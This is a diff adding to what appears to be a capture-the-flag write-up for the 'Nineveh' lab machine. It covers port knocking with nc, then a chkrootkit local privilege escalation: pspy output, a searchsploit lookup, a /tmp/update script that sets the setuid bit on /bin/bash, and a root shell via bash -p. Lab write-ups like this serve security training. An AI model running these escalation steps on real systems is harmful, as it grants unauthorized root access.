@@ -108,4 +108,47 @@ nc -w 1 $IP 571; nc -w 1 $IP 290; nc -w 1 $IP 911; ssh -i amrois.key amrois@$IP
 /home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                                                
 New path exported: /home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 
+You own the script: /usr/sbin/report-reset.sh
+/usr/bin/gettext.sh
+
+
 ```
+
+
+## chrootkit
+PSPY output:
+```
+2021/06/11 20:55:03 CMD: UID=0    PID=16729  | /bin/sh /usr/bin/chkrootkit 
+```
+
+```bash
+└─$ searchsploit chkrootkit              
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                           |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                                                     | linux/local/38775.rb
+Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                                                             | linux/local/33899.txt
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+```
+
+Using linux/local/33899.txt
+Create /tmp/update, add +x
+```bash
+amrois@nineveh:/tmp$ cat update 
+#!/bin/bash
+
+chmod +s /bin/bash
+```
+
+```bash
+amrois@nineveh:/tmp$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
+amrois@nineveh:/tmp$ bash -p
+bash-4.3# cd /root
+bash-4.3# ls
+root.txt  test.txt  vulnScan.sh
+bash-4.3# cat root.txt
+```
+
